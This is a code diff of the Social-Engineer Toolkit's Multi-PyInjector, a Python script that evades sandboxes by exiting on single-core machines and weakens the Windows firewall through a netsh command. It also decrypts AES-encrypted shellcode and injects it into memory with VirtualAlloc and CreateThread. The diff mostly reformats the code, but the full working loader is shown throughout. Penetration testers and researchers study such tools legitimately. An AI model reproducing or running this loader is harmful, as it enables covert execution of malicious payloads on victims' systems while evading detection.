@@ -1,7 +1,7 @@
 #
 # The Social-Engineer Toolkit Multi-PyInjector revised and simplified version.
 # Version: 0.4
-# 
+#
 # This will spawn only a seperate thread per each shellcode instance.
 #
 # Much cleaner and optimized code. No longer needs files and is passed via
@@ -20,14 +20,16 @@ import threading
 
 # added sandbox evasion here - most sandboxes use only 1 core
 if multiprocessing.cpu_count() < 2:
-        exit()
+    exit()
 
 # define our shellcode injection code through ctypes
+
+
 def injection(sc):
     sc = sc.decode("string_escape")
     sc = bytearray(sc)
     # Initial awesome code and credit found here:
-    # http://www.debasish.in/2012_04_01_archive.html 
+    # http://www.debasish.in/2012_04_01_archive.html
 
     ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                               ctypes.c_int(len(sc)),
@@ -45,25 +47,27 @@ def injection(sc):
                                              ctypes.c_int(0),
                                              ctypes.c_int(0),
                                              ctypes.pointer(ctypes.c_int(0)))
-    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
+    ctypes.windll.kernel32.WaitForSingleObject(
+        ctypes.c_int(ht), ctypes.c_int(-1))
 if __name__ == '__main__':
     multiprocessing.freeze_support()
-    subprocess.Popen("netsh advfirewall set global StatefulFTP disable", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+    subprocess.Popen("netsh advfirewall set global StatefulFTP disable",
+                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
     # this will be our ultimate filename we use for the shellcode generate
     # by the Social-Engineer Toolkit
     try:
-        
+
         # our file containing shellcode
         if len(sys.argv[1]) > 1:
             payload_filename = sys.argv[1]
             if os.path.isfile(payload_filename):
-                fileopen = file(payload_filename, "r")
+                fileopen = open(payload_filename, "r")
                 sc = fileopen.read()
 
             # if we didn't file our shellcode path then exit out
             if not os.path.isfile(payload_filename):
                 sys.exit()
-    
+
         if len(sys.argv[2]) > 1:
             # this is our secret key for decrypting the AES encrypted traffic
             secret = sys.argv[2]
@@ -76,21 +80,21 @@ if __name__ == '__main__':
             # one-liner to sufficiently pad the text to be encrypted
             pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
             # one-liners to decrypt a string which will be our shellcode
-            DecryptAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
+            DecryptAES = lambda c, e: c.decrypt(
+                base64.b64decode(e)).rstrip(PADDING)
             cipher = AES.new(secret)
             # our decrypted value for shellcode
             sc = DecryptAES(cipher, sc)
             # split our shellcode into a list
             sc = sc.split(",")
-        
+
     # except an indexerror and allow it to continue forward
     except IndexError:
         sys.exit()
-    
+
     jobs = []
     for payload in sc:
         if payload != "":
             p = multiprocessing.Process(target=injection, args=(payload,))
             jobs.append(p)
             p.start()
-
